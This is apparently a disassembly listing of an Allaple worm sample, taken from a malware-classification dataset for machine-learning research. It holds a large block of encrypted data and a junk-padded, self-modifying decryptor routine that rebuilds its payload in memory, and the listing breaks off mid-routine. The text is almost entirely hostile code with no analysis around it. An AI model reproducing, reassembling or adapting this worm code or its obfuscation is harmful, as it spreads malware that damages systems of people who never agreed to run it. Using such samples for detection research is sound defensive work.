; File Name   :	E:\MLContestSamples2\WORM_ALLAPLE_201601\20160228154623.167\359b64bbb7fc878934b581f2649dd7b963050315
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 0000345F (  13407.)
; Section size in file		: 00003600 (  13824.)
; Offset to raw	data for section: 00000400
; Flags	E0000060: Text Data Executable Readable	Writable
; Alignment	: default

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Write/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 401000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
		pop	eax
		scasb
		sbb	ch, bl
		test	eax, 0BB8D37FAh
		fstp8	st(4)
		sub	eax, 0D0DBD012h
		retf
; ---------------------------------------------------------------------------
		db 6Fh,	10h, 0DAh
		dd 3924C42Ah, 43256D9Fh, 0B7F8CCACh, 78E7F860h,	3F7FF1DEh
		dd 0D378D118h, 0DAED3C2Ah, 725AD598h, 3B79B1CCh, 62316260h
		dd 8163B581h, 0B9D37534h, 2E168E10h, 0EE44BBD6h, 161B072Fh
		dd 0ADED467Fh, 0D2FF0572h, 7CA66488h, 619C45A7h, 0E03C429Fh
		dd 14B02620h, 96E42B49h, 0A334255h, 3BA7ECF7h, 3381BB07h
		dd 1FFAA0B4h, 29EFEFCFh, 2CC927B0h, 6A0DBE8Dh, 0F704A6F1h
		dd 1948A7ECh, 92809573h, 0B527229h, 86AACD0h, 79114B1Fh
		dd 19D4C612h, 0D79B371Ch, 10825A42h, 81916A97h,	251435D7h
		dd 0AB8ACE67h, 54A8CE64h, 8901A4BBh, 303D5F94h,	4537BC04h
		dd 0C49F3142h, 4771F9D1h, 6AE64D22h, 0BBC8EBA5h, 0C54AE5C5h
		dd 9044EDF0h, 32124FF3h, 26005CDh, 65557978h, 23A0542Ah
		dd 3CD3B60Bh, 0ADB4E45Dh, 0EE2F9ABEh, 569027DCh, 1B515D36h
		dd 33696C0Dh, 0DA66F2C2h, 2AEABAFCh, 2EB9C7BBh,	94FB9888h
		dd 0E91DF1EEh, 22E4CCA3h, 2B125F66h, 6F67E968h,	86D0BD45h
		dd 7B32C77h, 3461C6C7h,	8F6915A9h, 0B6EF1DC9h, 87997CDDh
		dd 0AD7F365Dh, 173EA99Eh, 7FAB2F84h, 1C7E019Ch,	0D1057F8Bh
		dd 3D2BC99Fh, 0DA837F40h, 0EF78DC61h, 2266B0C8h, 551AD082h
		dd 128CB5A5h, 0B302A784h, 5DE505B9h, 6C42A0B3h,	295D5C5Fh
		dd 7BB978A6h, 12DEF10Ah, 0AC4ABC40h, 161C7B65h,	1599AF6Ah
		dd 367153D1h, 8C3D1352h, 0CF4AABFh, 7A260D66h, 1067D087h
		dd 0A5DA6CFDh, 1784C7EAh, 6518A4D7h, 0AA332A3Ah, 3161F569h
		dd 0AEABE432h, 3CB85033h, 0A8213E39h, 0DDC43DBDh, 0DABD76E0h
		dd 2B4D95BFh, 17A51A83h, 0CD6C7C86h, 758308ABh,	0D75316FAh
		dd 8073C7B3h, 2E626538h, 2A3B8E85h, 0CB258ABBh,	0DC966F60h
		dd 4F795446h, 6385F551h, 92481D43h, 1770B1B3h, 0CED2F146h
		dd 0F4AB21BCh, 5AB9BA00h, 2519D4E7h, 0AF358D3Bh, 320744F3h
		dd 0D3D5B96Dh, 0C5799829h, 39A73131h, 1BFE13CAh, 0A3E71EE4h
		dd 0CE451E36h, 6B2BFD56h, 0F331E900h, 0CC72C72Ch, 32724B75h
		dd 9DA3035Fh, 0FF133B97h, 0C67684D6h, 4B324C87h, 6F35F3FFh
		dd 0CEA60685h, 1CA6A83Fh, 4EC6D272h, 5F9DA737h,	5B414E63h
		dd 53BB713Ah, 25A60257h, 7A327410h, 2F87200Ch, 4CAC9192h
		dd 180A3CB6h, 19D5BF95h, 9BC3AF2Ah, 3B9F1DF5h, 0B739B161h
		dd 0EA213176h, 0DAEC3755h, 0AA8C7055h, 0A5622BA4h, 9BD65F09h
		dd 71F3B93Ah, 66F94296h, 0F784234Ch, 47718A9h, 2AD4AA92h
		dd 13A10641h, 0F27E886Ah, 53B4C74h, 0D7B642DCh,	19474F8Ch
		dd 57EDFD60h, 0B76E805Dh, 7131E3CDh, 0CBEB9D4Fh, 93AB9ABBh
		dd 5EFAE639h, 0D459D448h, 3CAB3255h, 38C0DA01h,	0E050C4A7h
		dd 68EB0C8h, 76B2B577h,	29B201B1h, 4C5323C8h, 7EAC2515h
		dd 4450FDC9h, 0CC2F31B2h, 0B4638897h, 0FA167B0Bh, 0BD2FB97Dh
		dd 71F9CABh, 0A99357A4h, 85A47321h, 7E92A83Fh, 0E0119DF4h
		dd 0B887AAE0h, 7CE6AE42h, 0AA80C7F6h, 65DA46BCh, 9BA651BEh
		dd 2EDEABDDh, 63A1D4CDh, 1987689Bh, 408CD8BBh, 0ECCBA41Ah
		dd 3E1F105Dh, 2894C992h, 0C7DE6EAh, 2444E8BAh, 1BEB2ECh
		dd 20C9BBE7h, 0FEBAF21Dh, 0E42811CAh, 35F9BBF4h, 0FB28E57Fh
		dd 8D2733EFh, 0A58CF5BEh, 79C4940Bh, 0FBA0EC4Ah, 7552D07Ch
		dd 54397524h, 0AE7AD770h, 0C8BDDCC5h, 0A042E5D1h, 9C59BC0Bh
		dd 5D30C1E4h, 4C5B5D89h, 94F731B1h, 0A31CE07h, 0CC8B9353h
		dd 31B0ABFAh, 822A3B68h, 15AE84E5h, 3E71FDFFh, 0F9EB58C3h
		dd 3B76AEFAh, 68351AE8h, 48F5D1F7h, 9BEBA21Eh, 0A73639F1h
		dd 0B5DB09D7h, 0E7ED117Bh, 4EBF96BDh, 26F5833Ah, 9EBE70AFh
		dd 1E5D1AC0h, 0F7FC1C71h, 95E7BF70h, 1AEA4DD3h,	0F42D9AE6h
		dd 0C3A2CF3Ah, 8DDD6827h, 83E21D2Bh, 15775CFCh,	0CDDCA9C4h
		dd 6EC05DD8h, 0B7F61A0Ch, 29CF18AEh, 4FF1BAFAh,	8A4B92E1h
		dd 0C953E996h, 0D1F86767h, 0CDF542D1h, 5097880h, 5310DA8Ah
		dd 0E86E4042h, 1EE45CBEh, 159AFD8Eh, 0C726916Dh, 0E93B5D47h
		dd 0B4485C75h, 0F14B7896h, 6874DABh, 8E0FFAEAh,	8133C812h
		dd 7D16941h, 3609C029h,	0B2357E0Eh, 0E1DA859Eh,	4CEFD66Ch
		dd 0E9B8C24Dh, 2973A92h, 3B58838Ah, 0B1A15C03h,	231D3BB9h
		dd 0F1F33874h, 39F678B2h, 3448F4E3h, 96EE8297h,	0A251B1D3h
		dd 0B9DD3AC1h, 8FD8BC7Fh, 8783DF0Ah, 87F7CE10h,	1BF1C9CDh
		dd 0B31E527Eh, 2F4B7508h, 4B10671Dh, 0E2758633h, 7B815F85h
		dd 21FF90F1h, 0B8A95AC9h, 0FA52319h, 0E433F23Fh, 0DF16460Eh
		dd 18AD25C5h, 1205EDF3h, 9CE005CBh, 2232B3C2h, 0C07CB6D2h
		dd 0DA0B844h, 95435C57h, 40D91896h, 0EA609C90h,	2F7EAD6Bh
		dd 0BBF6C40h, 9A5F908Ah, 0CB2A222Eh, 0CE5C458Ah, 0C8F3BFE6h
		dd 6FD1BDD1h, 0C8B1765Ah, 3DC8A728h, 37527CD3h,	4475FFE8h
		dd 72F7A216h, 22718736h, 1B9E648Ah, 67819194h, 94BB1729h
		dd 30066EC4h, 22D7011Bh, 1F5F9EBAh, 0B2EE635Bh,	8D4D9AC0h
		dd 433691ACh, 451CB164h, 4768334h, 52503ADAh, 1AED6B70h
		dd 358F2002h, 0A7AD05EAh, 4B4D9C38h, 9B7EF0CAh,	0AA84D30Ah
		dd 0DFC16B85h, 3A0FE351h, 4B39F15Fh, 165F8328h,	0E0492CAAh
		dd 0D3DF44EAh, 0A8F4C1C4h, 7BCBEFE4h, 315FC804h, 27EE99D2h
		dd 0E85BBEDDh, 224D114Bh, 1ED8EDCh, 0B895764Dh,	24F3EE62h
		dd 0E54E3C0Ah, 811BD0D5h, 0B8BDF2E4h, 2E780B86h, 0EEF8D9B6h
		dd 0A6352AD1h, 0C1656E45h, 0B5CA90E6h, 9B8205DBh, 9AE25F6Eh
		dd 6D619F6Fh, 6F123C12h, 0F179BCDh, 0E7D920B9h,	16336E46h
		dd 963D60BAh, 0E0DB198Bh, 5ABE82Ah, 2AA40F01h, 31C6E6Bh
		dd 125D5776h, 7E9874BFh, 0B2451246h, 0C3B9213Eh, 0DE196EEAh
		dd 3CF897Ch, 0DD52B27h,	27D35F66h, 0D2017419h, 36640118h
		dd 1A4A2DBCh, 9C6189F9h, 3B968F6Ah, 42F8E1D5h, 46033366h
		dd 79D649F5h, 5C38B990h, 829DB942h, 0E7CEDE20h,	91FBDC40h
		dd 5EEFF6AEh, 0A089ED82h, 2B2858FEh, 899BB58Ch,	0EE2695CEh
		dd 0F44D4EF2h, 368E716Ch, 0ABA97EC9h, 854DD871h, 0ADDF0CCDh
		dd 0C74C6C19h, 0A66039D7h, 8C543F1Fh, 0DF92CA88h, 16326AD2h
		dd 20334914h, 938BFEBh,	76883B29h, 39AE3859h, 0CCF14CF4h
		dd 8F7D0471h, 0A5AAF76Fh, 0E4EEBE62h, 0FD042652h, 0F3B5A899h
		dd 0C5911CEBh, 0FE711537h, 16D08140h, 7EF4A71Ah, 0E12E7439h
		dd 0E709E19Eh, 0D36C5223h, 55DFE4C8h, 2E89885Dh, 70A4912Bh
		dd 0B1D37E0Ah, 0B3DDDFA2h, 0A4991EBh, 3E05E206h, 0B19FACh
		dd 7F0CD76Ch, 538A31A7h, 46D47358h, 7042A3DBh, 6E15CABCh
		dd 2A36CC07h, 0F53C8F9Eh, 0A0406D1Fh, 0DFF38BEFh, 0FE9E6D4Bh
		dd 0CA901628h, 52A478A6h, 0BAFA33EAh, 0EB5BB378h, 75389F5Ch
		dd 2C1C4155h, 2522A4F2h, 0E2216850h, 9C7E5490h,	6904D763h
		dd 82B0BFDh, 4C55562Eh,	15A77373h, 0C55AEC91h, 0AAC62CD4h
		dd 0E6DB18D1h, 4ACBA08Bh, 77B714B4h, 80983401h,	4809D294h
		dd 0EFA7D820h, 1CB7B7DBh, 79F59DF5h, 0C4B887BDh, 0B26A5EC7h
		dd 0DEEEBA0Ch, 9E8C20ADh, 0FB5D6B44h, 4678CCB2h, 0C4ABDDDEh
		dd 3E0F9DB0h, 0D309425Dh, 0E7381B07h, 8705E0CDh, 0C178FF49h
		dd 7BEF5686h, 9883FF24h, 0BF252CCh, 8B6D5712h, 0F2C369A4h
		dd 0B7F1AC25h, 0E9682D2Eh, 0F2CB1B88h, 0C6B0C37h, 17D4B5C8h
		dd 2D1391BDh, 72EF9F22h, 395D3A79h, 95FE391Dh, 0F21012B4h
		dd 0B81CF356h, 93D55D57h, 0BE5BB615h, 533B46E5h, 7DDF4618h
		dd 63BDE2F6h, 99EDEB1Fh
		dd 0D51E6C40h, 9432CF47h, 0B4DD08Eh, 0D6779426h, 70CDDE1Bh
		dd 3C294E35h, 5E12692Dh, 0F6FAB796h, 0C388B76Dh, 7069CBDBh
		dd 0C93E8321h, 0DF3BFD14h, 433B478Bh, 6FAEDAB0h, 0F60B9BA7h
		dd 0B36A9316h, 0F758D32Dh, 316B2CAAh, 56141653h, 75DDDC15h
		dd 0B091027h, 0BDEC944Eh, 0CDDB0E83h, 0F244DFA1h, 8B8134E6h
		dd 6BA1FB9h, 23EF4910h,	1936ABB4h, 0AF864065h, 434E409Ah
		dd 0BA3CAC75h, 0FEBBA0F0h, 8FD67F54h, 29AC6D4Fh, 0FECD016Ch
		dd 0D9AD57F4h, 0DCDD7A0h, 0AC1DBA5Bh, 58609D4Dh, 0C08C52BEh
		dd 11D547DEh, 0EBC257D6h, 422E8C13h, 22C2C93Ah,	30DC08ADh
		dd 72F0498Dh, 0BDFF985h, 82BB45B9h, 0A1E9F151h,	0D39EB708h
		dd 16D3E806h, 549E7F7h,	4705705Dh, 0D1121BFFh, 2B8A1B53h
		dd 0BBA5847Eh, 0D9074CC4h, 0AEDCA657h, 0E8552BE7h, 8084BB99h
		dd 8115EBC9h, 0F4AEB096h, 0B1E3A11Dh, 0D96741AEh, 9E71207Ah
		dd 0FA4DE33Ah, 7EF0F202h, 2631F120h, 1F0E0E9Ch,	82E6436Bh
		dd 0AB3ADF40h, 0E6672C06h, 4A7FFC01h, 9D224C0Ch, 1AC1BF44h
		dd 1D8C8C32h, 0DB68319Ah, 911BB65Ah, 69D153A4h,	0A571598Eh
		dd 0CB127643h, 158A744Bh, 0F65062ECh, 0C232CC14h, 0CF706BA1h
		dd 0DDB8C4B3h, 8D34DEEBh, 0F405B509h, 0D0267C99h, 5EF4B6F9h
		dd 0F3ABF9D4h, 28D55638h, 0EE7AB78Ch, 9F6EEA68h, 0A23D18A4h
		dd 403C80C9h, 0C05B49B1h, 702A5F35h, 8D3F37Dh, 0E02E3398h
		dd 9B9934BBh, 2460AF33h, 0D9DD31F9h, 666CD869h,	0E1B59E8Dh
		dd 5505C588h, 607731DDh, 5923D572h, 70BABE6Bh, 0D60177F1h
		dd 0B2C243B4h, 8F64CB58h, 83490A84h, 0EA5707B4h, 0E52F6BB6h
		dd 571ED93Dh, 8525A99Bh, 4D8B8704h, 1CBBF168h, 711A77D4h
		dd 670F7971h, 0A8DBBBA1h, 233A6352h, 5993FB13h,	824A253Fh
		dd 8E31C793h, 5CAAADA0h, 4FA4C030h, 92DA2C8Eh, 780FD404h
		dd 432111B7h, 0EA0754A1h, 5D5B723Bh, 0ED2EF4A3h, 6395A666h
		dd 9115D749h, 0FB2B9190h, 6CCCD3AFh, 0F9BF087Bh, 64F6D29Bh
		dd 5715273Eh, 0E40F9019h, 0D989F7ACh, 2318800Ah, 6E37662Ch
		dd 21CB6DDBh, 4C55646Ch, 8A25D594h, 3032ED85h, 6177974Bh
		dd 0F3245106h, 341CF283h, 0B9A01E03h, 6EA50B64h, 0EDC125DCh
		dd 8EE1332Ah, 917E2280h, 4A35AA8Bh, 2DFD40C9h, 45509E4Fh
		dd 777E7204h, 7487481h,	0D12A53B5h, 3A3E6241h, 50E12169h
		dd 3114C86h, 208F71CEh,	44F38BE8h, 0A3AFFF2Dh, 6A6B8F6Ch
		dd 3665B5C5h

; =============== S U B	R O U T	I N E =======================================


		public start
start		proc near

var_64		= dword	ptr -64h

		sub	ecx, 2
		lea	edi, byte_40FAEC[edx]
		mov	[esp+var_64], offset word_4094AA
		sub	ecx, 2
		lea	edi, byte_40FAEC[edx]
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 0F96EC381h
		lea	edi, byte_40FAEC[edx]
		lea	ecx, byte_40DE7B[edx]
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		lea	ecx, byte_40DE7B[edx]
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 44C70040h
		xor	ax, bx
		xchg	eax, ebx
		sub	eax, esi
		sub	bp, bx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		xchg	eax, ebx
		sub	eax, esi
		sub	bp, bx
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 64AA9C24h
		sub	eax, esi
		sub	bp, bx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		sub	bp, bx
		lea	ecx, word_40D96E[esi]
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0C3810040h
		lea	ecx, word_40D96E[esi]
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		sub	di, di
		mov	ecx, [esp+var_64]
		or	dword ptr [ecx], offset	word_40F96E
		rol	ecx, 2
		mov	ebp, ebp
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		mov	ebp, ebp
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 9C24448Bh
		mov	edi, eax
		movzx	edx, ch
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		movzx	edx, ch
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 34180081h
		rcl	edx, 2
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		movzx	ecx, ah
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 30819359h
		sub	si, dx
		lea	ebp, byte_40DB69[edx]
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		lea	ebp, byte_40DB69[edx]
		mov	edx, [esp+var_64]
		or	dword ptr [edx], 0D3498A88h
		and	edi, ebp
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		movzx	edx, dh
		add	ax, ax
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 3302D0C1h
		add	ax, ax
		lea	edx, [edi+2]
		mov	ecx, edx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		lea	edx, [edi+2]
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 104B1C9h
		mov	ecx, edx
		sub	bx, si
		imul	eax
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		sub	bx, si
		imul	eax
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 669C244Ch
		imul	eax
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		sub	eax, edx
		test	eax, offset word_40DDFE
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 408DF723h
		test	eax, offset word_40DDFE
		add	bp, bx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		add	bp, bx
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 24448B02h
		shrd	eax, edi, 3
		and	eax, edx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		and	eax, edx
		test	ecx, ebp
		or	di, bx
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 1000819Ch
		test	ecx, ebp
		or	di, bx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		or	di, bx
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 816CDD80h
		lea	eax, [edi+2]
		sbb	edi, offset byte_40FEEB
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		sbb	edi, offset byte_40FEEB
		mov	edi, [esp+var_64]
		mov	eax, 62805030h
		stosd
		sar	edx, 2
		shrd	eax, eax, 3
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		shrd	eax, eax, 3
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 2408D7Ch
		lea	ecx, [ebx+2]
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		and	bp, si
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 4B2D233h
		mov	bp, si
		shrd	eax, ecx, 3
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		shrd	eax, ecx, 3
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 9C245401h
		mov	si, bx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		xor	ebp, esi
		test	bp, bx
		mov	ebx, [esp+var_64]
		or	dword ptr [ebx], 5C8BFA23h
		test	bp, bx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		test	esi, offset byte_40DA7F
		mov	edx, [esp+var_64]
		mov	dword ptr [edx], 3819C24h
		mov	eax, offset word_40FAFA
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		movzx	ebx, ah
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 0B9004050h
		mov	di, di
		sub	ax, cx
		test	si, bx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		sub	ax, cx
		test	si, bx
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0F7D08B66h
		test	si, bx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		test	edi, ebx
		or	edx, edx
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 8DD08BE5h
		or	edx, edx
		sub	esi, ecx
		test	ebx, ebp
		add	bx, bx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		sub	esi, ecx
		test	ebx, ebp
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 40DC7DB8h
		test	ebx, ebp
		add	bx, bx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		add	bx, bx
		mul	edx
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0B0C03300h
		mul	edx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		xor	eax, ebx
		mov	edi, [esp+var_64]
		mov	eax, 24440104h
		stosd
		sar	edi, 2
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		sub	bx, bx
		and	edi, ebx
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 8BE5F79Ch
		and	edi, ebx
		test	edi, ebp
		movzx	eax, ah
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		test	edi, ebp
		movzx	eax, ah
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 24548BD0h
		movzx	eax, ah
		add	bx, bx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		add	bx, bx
		mov	edi, [esp+var_64]
		mov	eax, 7202819Ch
		stosd
		lea	edx, byte_40D87F[edi]
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		and	edi, esi
		or	ecx, edi
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 8155D7D8h
		or	ecx, edi
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		mov	ax, si
		sub	cx, ax
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0D7DB9A32h
		sub	cx, ax
		or	ax, dx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		or	ax, dx
		mov	bx, cx
		mov	edx, [esp+var_64]
		mov	dword ptr [edx], 8DD08B55h
		mov	bx, cx
		ror	eax, 2
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		ror	eax, 2
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 40DC7DB8h
		lea	ebp, [ebp+2]
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		add	bp, bx
		add	eax, eax
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 0B3DB3300h
		add	eax, eax
		or	cx, dx
		sub	cx, cx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		or	cx, dx
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 245C0104h
		sub	cx, cx
		lea	esi, byte_40DFFC[esi]
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		lea	esi, byte_40DFFC[esi]
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 7DB88D9Ch
		mov	esi, esi
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		sub	edx, ebx
		add	bx, di
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 8B0040DCh
		add	bx, di
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		test	cx, si
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 819C244Ch
		or	esi, ebx
		xchg	eax, esi
		sub	cx, bx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		xchg	eax, esi
		sub	cx, bx
		mov	ebx, [esp+var_64]
		or	dword ptr [ebx], 504EC601h
		sub	cx, bx
		add	cx, dx
		and	di, dx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		add	cx, dx
		and	di, dx
		mov	ebx, [esp+var_64]
		or	dword ptr [ebx], 353181A0h
		and	di, dx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		lea	esi, byte_40FFE9[edx]
		mov	edi, [esp+var_64]
		mov	eax, 0BB0EFEAh
		stosd
		shl	ebp, 2
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		and	ebx, eax
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 33F885C0h
		add	di, bp
		test	ax, bp
		and	ebp, ebx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		test	ax, bp
		and	ebp, ebx
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 104B3DBh
		and	ebp, ebx
		or	ebx, ebp
		movsx	edx, dl
		and	bx, di
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		or	ebx, ebp
		movsx	edx, dl
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 859C245Ch
		movsx	edx, dl
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		and	bx, di
		mov	edx, [esp+var_64]
		or	dword ptr [edx], 24548BF8h
		movzx	ecx, dl
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		or	esi, eax
		xor	edi, esi
		test	si, ax
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 5602819Ch
		xor	edi, esi
		test	si, ax
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		test	si, ax
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 81ADFDE7h
		not	eax
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		movzx	ecx, dl
		sub	edi, edi
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 0FDA71632h
		sub	edi, edi
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		mov	ax, si
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 2788D16h
		or	eax, edi
		movsx	edx, bl
		mov	edi, ebx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		movsx	edx, bl
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0C933CB03h
		mov	edi, ebx
		add	bp, cx
		test	bp, bx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		add	bp, cx
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 4C0104B1h
		test	bp, bx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		add	cx, ax
		and	ebx, ebx
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 0CB039C24h
		and	ebx, ebx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		movsx	ecx, ch
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 9C244C8Bh
		mov	ebx, ebp
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		movzx	ecx, ch
		rcl	edx, 2
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 4500181h
		rcl	edx, 2
		mov	dx, bx
		or	bx, di
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		mov	dx, bx
		or	bx, di
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 4E8D0000h
		or	bx, di
		rcl	ebx, 2
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		rcl	ebx, 2
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 0C1C13302h
		xor	ebx, edi
		xor	ax, bx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		xor	ax, bx
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 0D23302D7h
		add	bp, di
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		test	edi, edx
		mov	edx, [esp+var_64]
		or	dword ptr [edx], 540104B2h
		mov	cx, si
		and	edx, ebp
		add	esi, 2
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		and	edx, ebp
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 0C1339C24h
		add	esi, 2
		and	bx, dx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		and	bx, dx
		xor	edi, ebp
		mov	edx, [esp+var_64]
		or	dword ptr [edx], 8B02D7C1h
		xor	edi, ebp
		xor	edi, ebp
		add	cx, si
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		xor	edi, ebp
		mov	edi, [esp+var_64]
		mov	eax, 819C245Ch
		stosd
		add	cx, si
		rol	ebx, 2
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		rol	ebx, 2
		mov	edx, esi
		mov	ecx, [esp+var_64]
		or	dword ptr [ecx], 41384603h
		mov	edx, esi
		test	eax, edx
		sub	dx, cx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		test	eax, edx
		sub	dx, cx
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 0C7338151h
		sub	dx, cx
		mov	edi, edi
		xadd	eax, esi
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		mov	edi, edi
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 0C14141FFh
		xadd	eax, esi
		lea	ebx, [ebp+2]
		add	eax, eax
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		lea	ebx, [ebp+2]
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 0CD8502D7h
		add	eax, eax
		add	di, si
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		add	di, si
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 3302E0C1h
		and	edx, offset byte_40F97F
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		add	eax, ecx
		add	edx, ecx
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 104B1C9h
		add	edx, ecx
		or	ebx, eax
		or	bp, di
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		or	ebx, eax
		or	bp, di
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 859C244Ch
		or	bp, di
		or	di, bx
		xor	ecx, ecx
		mov	cl, 4
